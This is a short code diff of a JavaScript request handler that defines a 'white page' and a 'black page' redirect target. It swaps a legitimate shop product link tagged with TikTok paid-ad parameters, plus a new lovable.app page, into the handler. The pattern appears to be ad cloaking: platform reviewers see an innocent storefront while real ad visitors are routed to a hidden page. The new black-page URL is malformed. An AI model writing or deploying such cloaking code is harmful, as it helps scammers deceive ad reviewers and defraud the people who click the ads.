@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://toyscentral.dk/products/neca-coraline-prop-replica-10-coraline-doll";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://www.superbe-bebe.com/products/baignoire-pliable-avec-coussin-de-bain-antiderapant?srsltid=AfmBOooiMgES__2U9GVtjWyYJ5qfUnVVZSm6pMsoVfJetNwpJS8vyish&utm_source=tiktok&utm_medium=paid&utm_id=__CAMPAIGN_ID__&utm_campaign=__CAMPAIGN_NAME__";
+    const blackPageURL = "https://https://wherlnquz.lovable.app/";
 
     //testing
   
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
